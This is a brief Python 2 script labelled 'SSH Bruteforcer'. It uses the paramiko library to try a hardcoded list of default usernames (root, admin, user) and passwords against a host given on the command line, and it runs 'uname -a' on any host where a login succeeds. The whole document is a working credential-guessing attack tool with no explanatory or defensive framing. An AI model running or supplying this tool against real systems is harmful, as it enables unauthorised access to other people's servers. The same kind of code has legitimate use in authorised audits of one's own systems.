#SSH Bruteforcer

import paramiko
import sys

host = sys.argv[1]
print "Host:%s" % host 

usernames = ['root','admin','user','username']
passwords = ['root','sudo','password']


ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for uname in usernames:
	for pword in passwords:
		try:
			print "Trying to login using username = %s and password = %s" % (uname,pword)
			ssh.connect(host,username=uname,password=pword)
			print "Successfully logged in using username = %s and password = %s" % (uname,pword)
			stdin,stdout,stderr=ssh.exec_command('uname -a')
			print "System Uptime : %s" % (stdout.readlines())
		except:
			print "%s  while trying username = %s and password = %s " % (sys.exc_info()[1],uname,pword)
